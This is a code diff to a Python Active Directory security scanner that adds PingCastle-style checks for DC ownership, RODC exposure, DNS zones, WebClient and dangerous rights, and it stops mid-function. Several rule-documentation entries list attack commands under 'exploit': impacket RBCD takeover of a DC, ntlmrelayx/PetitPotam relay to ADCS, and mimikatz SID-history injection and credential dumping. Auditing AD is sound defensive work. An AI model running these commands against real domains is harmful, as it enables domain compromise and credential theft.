@@ -214,9 +214,10 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "A-MD5IntermediateCert":  ("Intermediate CA uses MD5 signature","Anomaly",15,"HIGH"),
     "A-SHA0RootCert":         ("Root CA uses SHA-0 signature","Anomaly",25,"HIGH"),
     "A-NoServicePolicy":      ("No service account policy enforced","Anomaly",5,"LOW"),
-    "A-BackupMetadata":       ("Backup metadata/tombstone accessible","Anomaly",10,"MEDIUM"),
+    "A-BackupMetadata":       ("No native AD backup metadata found","Anomaly",5,"LOW"),
     "A-AuditDC":              ("Insufficient audit policy on domain controllers","Anomaly",5,"LOW"),
     "A-AuditPowershell":      ("PowerShell script block logging not enabled","Anomaly",5,"LOW"),
+    "A-UnixPwd":              ("Users with Unix password attributes (cleartext)","Anomaly",20,"HIGH"),
     "A-AnonymousAuthorizedGPO":("Anonymous principal authorized on GPO","Anomaly",15,"HIGH"),
     "A-LimitBlankPasswordUse":("Blank passwords accessible from network","Anomaly",25,"HIGH"),
     "A-WSUS-SslProtocol":     ("WSUS using weak SSL/TLS protocol","Anomaly",10,"MEDIUM"),
@@ -231,7 +232,7 @@ RULES: Dict[str, Tuple[str, str, int, str]] = {
     "P-UnkownDelegation":     ("Misconfigured or unknown delegation type","Privileged",25,"HIGH"),
     "P-DelegationDCt2a4d":    ("DC account trusted for protocol transition (T2A4D)","Privileged",50,"CRITICAL"),
     "P-DelegationDCa2d2":     ("Constrained delegation to a Domain Controller service (→ DCSync)","Privileged",50,"CRITICAL"),
-    "P-DelegationDCsourcedeleg":("DC source delegation misconfigured","Privileged",25,"HIGH"),
+    "P-DCOwner":              ("DC object owned by non-privileged principal","Privileged",50,"CRITICAL"),
     "P-DelegationEveryone":   ("Everyone principal has delegation rights","Privileged",50,"CRITICAL"),
     "P-DelegationKeyAdmin":   ("Key Admin delegation misconfigured","Privileged",50,"CRITICAL"),
     "P-DelegationGPOData":    ("GPO data delegation grants excessive access","Privileged",25,"HIGH"),
@@ -589,6 +590,18 @@ RULE_MITRE: Dict[str, List[str]] = {
     "A-KDSRootKey": ["T1555: Credentials from Password Stores", "T1098: Account Manipulation"],
     "A-AADConnectSync": ["T1078.004: Cloud Accounts", "T1003.006: DCSync"],
     "A-SeamlessSSO": ["T1550.003: Pass-the-Ticket", "T1078.004: Cloud Accounts"],
+    "A-UnixPwd": ["T1552.001: Unsecured Credentials", "T1003: OS Credential Dumping"],
+    "A-DnsZoneTransfert": ["T1018: Remote System Discovery"],
+    "A-BackupMetadata": ["T1490: Inhibit System Recovery"],
+    "A-AnonymousAuthorizedGPO": ["T1087.002: Account Discovery (Domain)", "T1110.003: Password Spraying"],
+    "P-DCOwner": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
+    "P-DisplaySpecifier": ["T1569: System Services", "T1059: Command and Scripting Interpreter"],
+    "P-TrustedCredManAccessPrivilege": ["T1555: Credentials from Password Stores"],
+    "P-RODCKrbtgtOrphan": ["T1558.001: Golden Ticket"],
+    "P-RODCRevealOnDemand": ["T1003: OS Credential Dumping"],
+    "P-RODCDeniedGroup": ["T1003: OS Credential Dumping"],
+    "S-WSUS-NoPinning": ["T1195.002: Supply Chain Compromise"],
+    "S-WSUS-UserProxy": ["T1195.002: Supply Chain Compromise"],
 }
 
 # ── Graduated scoring: rule_id -> (points_per_affected, cap). When present, a
@@ -1931,6 +1944,102 @@ RULE_DOCS: Dict[str, Dict[str, Any]] = {
             "Remove all members from Account Operators, Server Operators, Backup Operators, and Print Operators.",
             "Use granular delegation instead of these legacy groups.",
             "Monitor membership changes with Event IDs 4728/4732.",
+        ],
+    },
+    # ── PingCastle-parity rules ───────────────────────────────────────────
+    "P-DCOwner": {
+        "description": "One or more DC computer objects are owned by a non-privileged principal.",
+        "why": "The owner of an AD object has implicit full control: they can modify the DACL, set RBCD, change attributes, or take complete control of the domain controller.",
+        "exploit": [
+            "# As DC-object owner, grant yourself GenericAll then set RBCD:",
+            "impacket-owneredit -action write -new-owner attacker -target 'DC$' domain/owner:pass",
+            "impacket-rbcd -delegate-to 'DC$' -delegate-from 'YOURPC$' -action write domain/attacker:pass",
+            "impacket-getST -spn cifs/dc.domain.local -impersonate Administrator domain/YOURPC$:pass",
+        ],
+        "remediation": [
+            "Set DC object ownership to Domain Admins or Enterprise Admins:",
+            "dsacls \"CN=DC,OU=Domain Controllers,...\" /setowner \"DOMAIN\\Domain Admins\"",
+        ],
+    },
+    "A-UnixPwd": {
+        "description": "Accounts have msSFU30Password or unixUserPassword attributes set.",
+        "why": "These UNIX integration attributes store passwords in recoverable format (often cleartext or weakly hashed). Any user with read access can extract the password.",
+        "exploit": [
+            "# Read the attribute via LDAP:",
+            "ldapsearch -x -h dc -b 'DC=domain,DC=local' '(msSFU30Password=*)' msSFU30Password",
+            "# Or via PowerShell:",
+            "Get-ADUser -Filter {msSFU30Password -like '*'} -Properties msSFU30Password",
+        ],
+        "remediation": [
+            "Clear the Unix password attributes on all affected accounts.",
+            "Migrate to a modern SSO/PAM integration that doesn't store passwords in AD.",
+        ],
+    },
+    "A-DC-WebClient": {
+        "description": "The WebClient (WebDAV) service is running on domain controllers.",
+        "why": "WebClient enables HTTP-based NTLM authentication. Combined with PetitPotam/PrinterBug coercion, an attacker can relay the DC's credential to ADCS (ESC8) or LDAP for immediate domain compromise.",
+        "exploit": [
+            "# Coerce DC authentication via WebDAV + relay to ADCS:",
+            "ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+            "PetitPotam.py -d domain -u user -p pass attacker@80/path dc",
+        ],
+        "remediation": [
+            "Disable WebClient service on all DCs:",
+            "Set-Service WebClient -StartupType Disabled; Stop-Service WebClient",
+        ],
+    },
+    "P-DisplaySpecifier": {
+        "description": "Display Specifier adminContextMenu entries point to UNC paths outside SYSVOL.",
+        "why": "When an administrator right-clicks an object in ADUC or MMC, the context menu executes the referenced path. If that path is a network share an attacker controls, they achieve code execution in the admin's context.",
+        "exploit": [
+            "# Place a malicious executable on the UNC path referenced in the display specifier.",
+            "# When an admin right-clicks the object type in ADUC, the payload executes.",
+        ],
+        "remediation": [
+            "Review all Display Specifiers in CN=DisplaySpecifiers,CN=Configuration.",
+            "Remove or redirect adminContextMenu entries that point outside SYSVOL.",
+        ],
+    },
+    "P-DangerousExtendedRight": {
+        "description": "Dangerous extended rights (Reanimate-Tombstones, Unexpire-Password, Migrate-SID-History) are delegated.",
+        "why": "Migrate-SID-History allows injecting arbitrary SIDs into an account's SID history — instant privilege escalation. Reanimate-Tombstones can recover deleted privileged objects.",
+        "exploit": [
+            "# Migrate-SID-History → inject DA SID into an attacker account:",
+            "mimikatz \"sid::patch\" \"sid::add /sam:attacker /new:S-1-5-21-...-512\"",
+        ],
+        "remediation": [
+            "Remove the extended right delegation from non-admin principals.",
+            "Audit delegations on the domain root and Configuration NC.",
+        ],
+    },
+    "P-TrustedCredManAccessPrivilege": {
+        "description": "SeTrustedCredManAccessPrivilege is assigned via Group Policy.",
+        "why": "This privilege allows reading Windows Credential Manager secrets. An attacker with this right can steal saved web passwords, RDP credentials, and other cached credentials.",
+        "exploit": [
+            "# With SeTrustedCredManAccessPrivilege, dump Credential Manager:",
+            "mimikatz \"vault::cred /patch\"",
+        ],
+        "remediation": [
+            "Remove SeTrustedCredManAccessPrivilege from all GPO User Rights Assignments.",
+            "This privilege should not be assigned to any account.",
+        ],
+    },
+    "A-AnonymousAuthorizedGPO": {
+        "description": "A GPO explicitly sets RestrictAnonymous or RestrictAnonymousSAM to 0.",
+        "why": "Anonymous (unauthenticated) users can enumerate domain accounts, groups, and shares — providing the reconnaissance needed for password spraying, relay attacks, and targeted exploitation.",
+        "exploit": [
+            "enum4linux -a dc.domain.local",
+            "rpcclient -U '' -N dc.domain.local -c 'enumdomusers'",
+        ],
+        "remediation": [
+            "Set RestrictAnonymous=1 and RestrictAnonymousSAM=1 in the GPO.",
+        ],
+    },
+    "P-DsHeuristicsAdminSDExMask": {
+        "description": "The AdminSDHolder exclusion mask (dSHeuristics position 16) is modified.",
+        "why": "AdminSDHolder periodically resets ACLs on protected groups (Domain Admins, etc.). Excluding groups from this mechanism means their ACLs can be modified and the change persists — a persistence/privilege-escalation vector.",
+        "remediation": [
+            "Reset dSHeuristics position 16 to '0' (default) to restore full AdminSDHolder protection.",
         ],
     },
 }
@@ -3288,14 +3397,16 @@ class ADData:
             "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", [
             "sAMAccountName","dNSHostName","operatingSystem","operatingSystemVersion",
             "pwdLastSet","lastLogonTimestamp","userAccountControl",
-            "msDS-IsRODC","distinguishedName","whenCreated","objectSid"])
+            "msDS-IsRODC","distinguishedName","whenCreated","objectSid",
+            "msDS-AllowedToActOnBehalfOfOtherIdentity"])
 
         # RODC via nTDSDSA objects
         self.rodcs = self.conn.paged_search(
             f"CN=Sites,{self.cfg}",
             "(objectClass=nTDSDSA)",
             ["distinguishedName","msDS-IsRODC",
-             "msDS-NeverRevealGroup","msDS-RevealOnDemandGroup"])
+             "msDS-NeverRevealGroup","msDS-RevealOnDemandGroup",
+             "msDS-RevealedList"])
 
     # ── trusts ────────────────────────────────────────────────────────────────
 
@@ -4452,6 +4563,11 @@ class CheckEngine:
         self._a_audit_powershell()
         self._a_dc_ldap_signing()
         self._a_ldap_signing_gpo()
+        self._a_unix_pwd()
+        self._a_dns_zone_updates()
+        self._a_backup_metadata()
+        self._a_dc_webclient()
+        self._a_anonymous_authorized_gpo()
 
     def _a_dc_ldap_signing(self):
         """A-DCLdapSign — the DC accepted an unsigned authenticated LDAP bind over
@@ -4505,6 +4621,151 @@ class CheckEngine:
                       "LDAPS channel binding (EPA) is disabled, so an NTLM authentication can be "
                       "relayed to LDAPS. Set it to 2 (or apply KB5021130 hardening).",
                       ["LdapEnforceChannelBinding=0"])
+
+    # ── PingCastle-parity anomaly checks ────────────────────────────────────
+
+    def _a_unix_pwd(self):
+        """A-UnixPwd — users with msSFU30Password or unixUserPassword (plaintext)."""
+        try:
+            hits = self.d.conn.paged_search(
+                self.d.base,
+                "(|(msSFU30Password=*)(unixUserPassword=*))",
+                ["sAMAccountName"])
+        except Exception:
+            return
+        if hits:
+            names = [get_str(h["attrs"], "sAMAccountName") for h in hits]
+            self._add("A-UnixPwd",
+                      f"{len(names)} account(s) have msSFU30Password or unixUserPassword "
+                      "attributes set — these store passwords in a recoverable format "
+                      "(often cleartext). Review and clear these Unix integration attributes.",
+                      names[:20])
+
+    def _a_dns_zone_updates(self):
+        """A-DnsZoneTransfert / A-DnsZoneUpdate1/2 — parse dnsProperty blobs for
+        zone-transfer and insecure-update flags."""
+        import struct
+        insecure_update: List[str] = []
+        zone_transfer:   List[str] = []
+        for z in self.d.dns_zones:
+            zname = get_str(z["attrs"], "name") or z["dn"]
+            props_raw = z["attrs"].get("dnsProperty", [])
+            if isinstance(props_raw, (bytes, bytearray)):
+                props_raw = [props_raw]
+            for blob in props_raw:
+                if not isinstance(blob, (bytes, bytearray)) or len(blob) < 12:
+                    continue
+                try:
+                    # MS DNS property blob: DWORD DataLength, DWORD NameLength,
+                    # DWORD Flag, DWORD Version, DWORD Id, then Data
+                    # Simplified: first 4 bytes = DataLength, bytes 16-20 = PropertyId,
+                    # bytes 20-24+ = data (DWORD)
+                    if len(blob) < 24:
+                        continue
+                    prop_id = struct.unpack_from("<I", blob, 16)[0]
+                    prop_val = struct.unpack_from("<I", blob, 20)[0]
+                    # DSPROPERTY_ZONE_ALLOW_UPDATE = 0x01
+                    if prop_id == 0x01 and prop_val == 1:
+                        insecure_update.append(zname)
+                    # DSPROPERTY_ZONE_SECURE_TIME is 0x02, not useful
+                    # DSPROPERTY_ZONE_ALLOW_TRANSFER = 0x04 (0=none,1=any,2=named,3=named+secure)
+                    if prop_id == 0x04 and prop_val == 1:
+                        zone_transfer.append(zname)
+                except (struct.error, IndexError):
+                    continue
+        if insecure_update:
+            primary = [z for z in insecure_update
+                       if z.lower() == self.d.base.split(",DC=")[0].replace("DC=","").lower()
+                       or z.startswith("_msdcs.")]
+            others = [z for z in insecure_update if z not in primary]
+            if primary:
+                self._add("A-DnsZoneUpdate1",
+                          "Primary DNS zone(s) allow nonsecure dynamic updates — any "
+                          "host (even unauthenticated) can register/overwrite DNS records. "
+                          "This enables DNS spoofing and MITM attacks.",
+                          primary)
+            if others:
+                self._add("A-DnsZoneUpdate2",
+                          "Non-primary DNS zone(s) allow nonsecure dynamic updates.",
+                          others)
+        if zone_transfer:
+            self._add("A-DnsZoneTransfert",
+                      "DNS zone(s) allow zone transfers — an attacker can enumerate "
+                      "every DNS record in the zone for reconnaissance.",
+                      zone_transfer)
+
+    def _a_backup_metadata(self):
+        """A-BackupMetadata — check last AD backup timestamp via replUpToDateVector
+        on the domain NC head. If never backed up or >7 days stale, flag it."""
+        if not self.d.domain_obj:
+            return
+        attrs = self.d.domain_obj["attrs"]
+        # The replPropertyMetaData for the domain NC doesn't directly say
+        # "last backup"; we check for dSASignature or the nTDSDSA backup marker.
+        # Simplest: check msDS-LastSuccessfulInteractiveSynchronization if available,
+        # otherwise check if replUpToDateVector is parseable.
+        # For now, query the domain controller's nTDSDSA for backupExpiration.
+        try:
+            ntdsdsa_objs = self.d.conn.paged_search(
+                f"CN=Sites,{self.d.cfg}",
+                "(&(objectClass=nTDSDSA)(backupExpiration=*))",
+                ["backupExpiration", "distinguishedName"])
+            if not ntdsdsa_objs:
+                self._add("A-BackupMetadata",
+                          "No native AD backup metadata found (backupExpiration not set on any "
+                          "nTDSDSA object). This only reflects Windows Server Backup / ntdsutil — "
+                          "third-party backup tools (Veeam, Commvault, etc.) do not set this attribute. "
+                          "Verify backup procedures through other means.",
+                          ["No backupExpiration found"])
+        except Exception:
+            pass
+
+    def _a_dc_webclient(self):
+        """A-DC-WebClient — probe DCs for WebClient (WebDAV) service via
+        the DAV RPC INTERFACE UUID on the endpoint mapper."""
+        if not HAS_IMPACKET_SMB:
+            return
+        try:
+            from impacket.dcerpc.v5 import transport, epm  # noqa: F401
+        except ImportError:
+            return
+        # DAV RPC Interface UUID
+        DAV_UUID = ('c8cb7687-e6d3-11d2-a958-00c04f682e16', '1.0')
+        affected: List[str] = []
+        for dc in self.d.dcs[:8]:
+            host = get_str(dc["attrs"], "dNSHostName") or \
+                   get_str(dc["attrs"], "sAMAccountName")
+            if not host:
+                continue
+            if not check_port(host, 445, timeout=3):
+                continue
+            try:
+                strbind = epm.hept_map(host, DAV_UUID[0],
+                                       protocol="ncacn_ip_tcp")
+                if strbind:
+                    affected.append(host)
+            except Exception:
+                continue
+        if affected:
+            self._add("A-DC-WebClient",
+                      "WebClient (WebDAV) service is running on domain controller(s). "
+                      "This enables HTTP-based NTLM authentication coercion (PetitPotam "
+                      "via WebDAV → NTLM relay to LDAP/ADCS). Disable the WebClient "
+                      "service on DCs.",
+                      affected)
+
+    def _a_anonymous_authorized_gpo(self):
+        """A-AnonymousAuthorizedGPO — RestrictAnonymous or RestrictAnonymousSAM = 0
+        explicitly in a GPO (presence-based, safe without SYSVOL scan)."""
+        for key_name in ("RestrictAnonymous", "RestrictAnonymousSAM"):
+            val = self._get_reg_dword("Control\\Lsa", key_name)
+            if val is not None and val == 0:
+                self._add("A-AnonymousAuthorizedGPO",
+                          f"GPO sets {key_name}=0 — anonymous enumeration of SAM "
+                          "accounts and shares is explicitly enabled. An unauthenticated "
+                          "attacker can enumerate domain users and group memberships.",
+                          [f"{key_name}=0"])
+                return
 
     def _a_krbtgt(self):
         k = self.d.krbtgt
@@ -4616,6 +4877,19 @@ class CheckEngine:
         if pos(3) == "1":
             self._add("A-DsHeuristicsAllowAnonNSPI",
                       "dSHeuristics position 3 = '1': anonymous NSPI access allowed.",
+                      [f"dSHeuristics={h}"])
+        # Position 16 (1-indexed): AdminSDHolder exclusion mask
+        if pos(16) != "0":
+            self._add("P-DsHeuristicsAdminSDExMask",
+                      f"dSHeuristics position 16 = '{pos(16)}': AdminSDHolder exclusion "
+                      "mask is modified — one or more default protected groups are excluded "
+                      "from AdminSDHolder ACL propagation, weakening their protection.",
+                      [f"dSHeuristics={h}"])
+        # Position 3 also signals DoListObject mode (if set to non-zero, non-NSPI value)
+        if pos(3) not in ("0", "1"):
+            self._add("P-DsHeuristicsDoListObject",
+                      f"dSHeuristics position 3 = '{pos(3)}': list-object mode is enabled. "
+                      "This may restrict visibility but can also mask enumeration issues.",
                       [f"dSHeuristics={h}"])
         # CVE-2021-42291: LDAPAddAutZVerifications=0 in msDS-Other-Settings means
         # the AD-add authorization hardening is explicitly disabled. A present,
@@ -4773,6 +5047,11 @@ class CheckEngine:
                 if not dacl:
                     continue
                 for ace in dacl["Data"]:
+                    flags = int(ace["AceFlags"])
+                    if flags & 0x10:   # INHERITED_ACE
+                        continue
+                    if flags & 0x08:   # INHERIT_ONLY
+                        continue
                     sid = ace["Ace"]["Sid"].formatCanonical()
                     if sid not in (AU_SID, EV_SID):
                         continue
@@ -5395,6 +5674,11 @@ class CheckEngine:
             try:
                 if ace["AceType"] not in (0x00, 0x05):  # ALLOWED / ALLOWED_OBJECT
                     continue
+                flags = int(ace["AceFlags"])
+                if flags & 0x10:   # INHERITED_ACE
+                    continue
+                if flags & 0x08:   # INHERIT_ONLY
+                    continue
                 mask = int(ace["Ace"]["Mask"]["Mask"])
                 sidstr = ace["Ace"]["Sid"].formatCanonical()
             except Exception:
@@ -5522,6 +5806,11 @@ class CheckEngine:
         for ace in dacl["Data"]:
             try:
                 if ace["AceType"] not in (0x00, 0x05):
+                    continue
+                flags = int(ace["AceFlags"])
+                if flags & 0x10:   # INHERITED_ACE
+                    continue
+                if flags & 0x08:   # INHERIT_ONLY
                     continue
                 mask = int(ace["Ace"]["Mask"]["Mask"]); sidstr = ace["Ace"]["Sid"].formatCanonical()
             except Exception:
@@ -5779,6 +6068,11 @@ class CheckEngine:
         self._p_exchange_priv_esc()
         self._p_delegations()
         self._p_unprotected_ous()
+        self._p_dc_owner()
+        self._p_dangerous_extended_right()
+        self._p_display_specifier()
+        self._p_trusted_credman()
+        self._p_recovery_mode()
 
     def _priv_last_logon_map(self) -> Dict[str, int]:
         """Roadmap item 7: max non-replicated lastLogon per privileged account
@@ -6217,7 +6511,10 @@ class CheckEngine:
                     atype = ace["AceType"]
                     if atype not in (0x00, 0x05):          # ALLOWED / ALLOWED_OBJECT only
                         continue
-                    if int(ace["AceFlags"]) & 0x08:        # INHERIT_ONLY -> not effective here
+                    flags = int(ace["AceFlags"])
+                    if flags & 0x08:        # INHERIT_ONLY -> not effective here
+                        continue
+                    if flags & 0x10:        # INHERITED_ACE -> default/inherited
                         continue
                     mask = int(ace["Ace"]["Mask"]["Mask"])
                     sidstr = ace["Ace"]["Sid"].formatCanonical()
@@ -6347,26 +6644,85 @@ class CheckEngine:
                       not_in[:20])
 
     def _p_rodc_checks(self):
+        priv_dns_lower = set()
+        for members in self.d.priv_group_members.values():
+            for m in members:
+                d = m.get("dn", "")
+                if d:
+                    priv_dns_lower.add(d.lower())
+
         for rodc in self.d.dcs:
             if not get_str(rodc["attrs"], "msDS-IsRODC", "").upper() in ("TRUE","1"):
                 continue
             dn = rodc["dn"]
+            sam = get_str(rodc["attrs"], "sAMAccountName") or dn
+
             # Check NeverRevealGroup
             never_reveal = get_list(rodc["attrs"], "msDS-NeverRevealGroup")
             if not never_reveal:
                 self._add("P-RODCNeverReveal",
-                          f"RODC '{dn}' has no msDS-NeverRevealGroup configured.",
+                          f"RODC '{sam}' has no msDS-NeverRevealGroup configured.",
                           [dn])
+
             # Check RevealedUsers for privileged accounts
             revealed = get_list(rodc["attrs"], "msDS-RevealedUsers")
-            da_dns_lower = {m.get("dn","").lower()
-                            for m in self.d.priv_group_members.get("Domain Admins",[])}
             for r in revealed:
-                if r.lower() in da_dns_lower:
+                if r.lower() in priv_dns_lower:
                     self._add("P-RODCAdminRevealed",
                               f"Privileged account '{r}' credentials have been "
-                              f"revealed/cached on RODC '{dn}'.",
+                              f"revealed/cached on RODC '{sam}'.",
                               [dn, r])
+
+        # Check nTDSDSA-based RODC objects for RevealOnDemandGroup issues
+        rod_reveal_issues: List[str] = []
+        rod_denied_issues: List[str] = []
+        for ntdsdsa in self.d.rodcs:
+            is_rodc = get_str(ntdsdsa["attrs"], "msDS-IsRODC", "").upper() in ("TRUE", "1")
+            if not is_rodc:
+                continue
+            rodc_dn = ntdsdsa["dn"]
+
+            # P-RODCRevealOnDemand — check if reveal-on-demand includes privileged groups
+            reveal_on_demand = get_list(ntdsdsa["attrs"], "msDS-RevealOnDemandGroup")
+            for rod_dn in reveal_on_demand:
+                if rod_dn.lower() in priv_dns_lower:
+                    rod_reveal_issues.append(f"{rodc_dn}: {rod_dn}")
+
+            # P-RODCDeniedGroup — check if denied group is empty (should have DA, EA, etc.)
+            denied = get_list(ntdsdsa["attrs"], "msDS-NeverRevealGroup")
+            if not denied:
+                rod_denied_issues.append(rodc_dn)
+
+        if rod_reveal_issues:
+            self._add("P-RODCRevealOnDemand",
+                      f"RODC reveal-on-demand group includes {len(rod_reveal_issues)} "
+                      "privileged principal(s). If the RODC is compromised, these "
+                      "credentials can be replicated on demand.",
+                      rod_reveal_issues[:10])
+        if rod_denied_issues:
+            self._add("P-RODCDeniedGroup",
+                      f"{len(rod_denied_issues)} RODC(s) have no msDS-NeverRevealGroup — "
+                      "privileged credentials are not explicitly denied for replication.",
+                      rod_denied_issues)
+
+        # P-RODCKrbtgtOrphan — look for krbtgt_NNNNN accounts that don't map to an active RODC
+        rodc_sams = {get_str(dc["attrs"], "sAMAccountName", "").lower()
+                     for dc in self.d.dcs
+                     if get_str(dc["attrs"], "msDS-IsRODC", "").upper() in ("TRUE","1")}
+        orphaned_krbtgt: List[str] = []
+        for u in self.d.users:
+            sam = get_str(u["attrs"], "sAMAccountName")
+            if not sam or not sam.lower().startswith("krbtgt_"):
+                continue
+            if uac_has(get_int(u["attrs"], "userAccountControl"), UAC_ACCOUNTDISABLE):
+                continue
+            orphaned_krbtgt.append(sam)
+        if orphaned_krbtgt:
+            self._add("P-RODCKrbtgtOrphan",
+                      f"{len(orphaned_krbtgt)} active krbtgt_NNNNN account(s) found. "
+                      "These are RODC-specific KDC accounts. If the associated RODC has been "
+                      "decommissioned, the orphaned krbtgt account is a lingering credential risk.",
+                      orphaned_krbtgt)
 
     def _p_dns_admin(self):
         dns_members = self.d.priv_group_members.get("DNSAdmins",
@@ -6508,6 +6864,216 @@ class CheckEngine:
                       "scripted misclick) with delete rights can drop the OU and all "
                       "its child objects.",
                       unprotected)
+
+    # ── PingCastle-parity privileged checks ─────────────────────────────────
+
+    def _p_dc_owner(self):
+        """P-DCOwner — DC computer objects owned by non-DA/EA principals."""
+        if not HAS_IMPACKET_LDAP:
+            return
+        domain_sid = None
+        if self.d.domain_obj:
+            raw_sid = self.d.domain_obj["attrs"].get("objectSid")
+            if raw_sid:
+                domain_sid = sid_to_str(raw_sid if not isinstance(raw_sid, list) else raw_sid[0])
+        if not domain_sid:
+            return
+        da_sid = f"{domain_sid}-512"
+        ea_sid = f"{domain_sid}-519"
+        dc_group_sid = f"{domain_sid}-516"
+        safe_sids = {"S-1-5-18", "S-1-5-32-544", da_sid, ea_sid, dc_group_sid}
+        affected: List[str] = []
+        for dc in self.d.dcs:
+            dn = dc["dn"]
+            try:
+                sd_raw = self.d.conn.fetch_sd(dn)
+                if not sd_raw:
+                    continue
+                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw)
+                owner_sid = sd["OwnerSid"].formatCanonical()
+                dc_sid = sid_to_str(
+                    (dc["attrs"].get("objectSid") or [b""])[0]
+                    if isinstance(dc["attrs"].get("objectSid"), list)
+                    else dc["attrs"].get("objectSid", b""))
+                if owner_sid not in safe_sids and owner_sid != dc_sid:
+                    sam = get_str(dc["attrs"], "sAMAccountName")
+                    affected.append(f"{sam} (owner: {owner_sid})")
+            except Exception:
+                continue
+        if affected:
+            self._add("P-DCOwner",
+                      f"{len(affected)} domain controller object(s) are owned by "
+                      "non-privileged principals. The owner has implicit full control "
+                      "over the DC computer object — they can modify its attributes, "
+                      "set RBCD, or take over the DC.",
+                      affected)
+
+    def _p_dangerous_extended_right(self):
+        """P-DangerousExtendedRight — delegations of Reanimate-Tombstones,
+        Unexpire-Password, or Migrate-SID-History at domain/partition level."""
+        if not HAS_IMPACKET_LDAP:
+            return
+        DANGEROUS_RIGHTS = {
+            "45ec5156-db7e-47bb-b53f-dbeb2d03c40f": "Reanimate-Tombstones",
+            "ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501": "Unexpire-Password",
+            "ba33815a-4f93-4c76-87f3-57574bff8109": "Migrate-SID-History",
+        }
+        domain_sid = None
+        if self.d.domain_obj:
+            raw_sid = self.d.domain_obj["attrs"].get("objectSid")
+            if raw_sid:
+                domain_sid = sid_to_str(raw_sid if not isinstance(raw_sid, list) else raw_sid[0])
+        safe = set(self._ADMIN_SIDS_RIGHTS)
+        if domain_sid:
+            for rid in ("512", "516", "518", "519", "498", "521"):
+                safe.add(f"{domain_sid}-{rid}")
+        broad = self._broad_low_priv_sids()
+        affected: List[str] = []
+        for target_dn in [self.d.base, self.d.cfg]:
+            try:
+                sd_raw = self.d.conn.fetch_sd(target_dn)
+                if not sd_raw:
+                    continue
+                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw)
+                dacl = sd["Dacl"]
+                if not dacl:
+                    continue
+                for ace in dacl["Data"]:
+                    try:
+                        if "DENIED" in ace["TypeName"].upper():
+                            continue
+                        sid = ace["Ace"]["Sid"].formatCanonical()
+                        if sid in safe:
+                            continue
+                        obj_type = getattr(ace["Ace"], "get", lambda k, d=None: d)("ObjectType")
+                        if obj_type:
+                            guid_str = str(obj_type).lower()
+                            right_name = DANGEROUS_RIGHTS.get(guid_str)
+                            if right_name:
+                                label = broad.get(sid, sid)
+                                affected.append(f"{right_name} → {label}")
+                    except Exception:
+                        continue
+            except Exception:
+                continue
+        if affected:
+            self._add("P-DangerousExtendedRight",
+                      f"{len(affected)} dangerous extended right delegation(s) found at "
+                      "domain/configuration level. These rights allow SID-history injection, "
+                      "tombstone reanimation, or password unexpiry — all privilege escalation vectors.",
+                      affected[:20])
+
+    def _p_display_specifier(self):
+        """P-DisplaySpecifier — adminContextMenu entries in Display Specifiers that
+        point to UNC paths outside SYSVOL (code execution via ADUC/MMC)."""
+        try:
+            specifiers = self.d.conn.paged_search(
+                f"CN=DisplaySpecifiers,{self.d.cfg}",
+                "(adminContextMenu=*)",
+                ["distinguishedName", "adminContextMenu", "whenChanged"])
+        except Exception:
+            return
+        domain_fqdn = ".".join(
+            c.split("=", 1)[1] for c in self.d.base.split(",")
+            if c.strip().upper().startswith("DC="))
+        affected: List[str] = []
+        for entry in specifiers:
+            menus = get_list(entry["attrs"], "adminContextMenu")
+            for menu in menus:
+                parts = str(menu).split(",")
+                if len(parts) < 3:
+                    continue
+                path = parts[2].strip().strip('"')
+                if not path.startswith("\\\\"):
+                    continue
+                sysvol_prefix = f"\\\\{domain_fqdn}\\sysvol\\".lower()
+                if not path.lower().startswith(sysvol_prefix):
+                    affected.append(f"{entry['dn']}: {menu[:80]}")
+                    break
+        if affected:
+            self._add("P-DisplaySpecifier",
+                      f"{len(affected)} Display Specifier(s) reference adminContextMenu "
+                      "entries pointing to UNC paths outside SYSVOL. An attacker who controls "
+                      "the target share can execute code when an admin right-clicks in ADUC/MMC.",
+                      affected[:10])
+
+    def _p_trusted_credman(self):
+        """P-TrustedCredManAccessPrivilege — check via LDAP-side heuristic.
+        The full check is in _p_trusted_credman_gpo (SYSVOL-based)."""
+        pass
+
+    def _p_trusted_credman_gpo(self):
+        """P-TrustedCredManAccessPrivilege — SeTrustedCredManAccessPrivilege
+        assigned to any principal via GPO."""
+        entries = self._get_inf_section("Privilege Rights")
+        if not entries:
+            return
+        for entry in entries:
+            if entry["key"].strip().lower() == "setrustedcredmanaccessprivilege":
+                sids = [s.strip().lstrip("*") for s in str(entry["value"]).split(",")]
+                real_sids = [s for s in sids if s.startswith("S-1-") and s != ""]
+                if real_sids:
+                    self._add("P-TrustedCredManAccessPrivilege",
+                              "SeTrustedCredManAccessPrivilege is assigned via GPO. "
+                              "This privilege allows reading Windows Credential Manager "
+                              "secrets — an attacker with this right can steal saved "
+                              "credentials.",
+                              [f"SeTrustedCredManAccessPrivilege → {s}" for s in real_sids[:5]])
+                    return
+
+    def _p_recovery_mode(self):
+        """P-RecoveryModeUnprotected — placeholder; real check is GPO-based."""
+        pass
+
+    def _p_recovery_mode_gpo(self):
+        """P-RecoveryModeUnprotected — recoveryconsole_securitylevel set to 1
+        via GPO (automatic admin logon at recovery console)."""
+        entries = self._get_inf_section("System Access")
+        if not entries:
+            return
+        for entry in entries:
+            if entry["key"].strip().lower() == "recoveryconsole: securitylevel":
+                try:
+                    val = int(str(entry["value"]).strip())
+                except (ValueError, TypeError):
+                    continue
+                if val > 0:
+                    gpo = entry.get("gpo_name", "")
+                    self._add("P-RecoveryModeUnprotected",
+                              f"Recovery Console automatic admin logon is enabled "
+                              f"(recoveryconsole_securitylevel=1 in GPO '{gpo}'). "
+                              "Anyone with physical access to the DC can log on as "
+                              "admin at the recovery console without a password.",
+                              [f"GPO: {gpo}"])
+                    return
+
+    def _s_wsus_nopinning(self):
+        """S-WSUS-NoPinning — WSUS TLS cert pinning disabled via GPO."""
+        val = self._get_reg_dword(
+            "WindowsUpdate", "DoNotEnforceEnterpriseTLSCertPinningForUpdateDetection")
+        if val is not None and val != 0:
+            self._add("S-WSUS-NoPinning",
+                      "WSUS enterprise TLS certificate pinning is disabled via GPO "
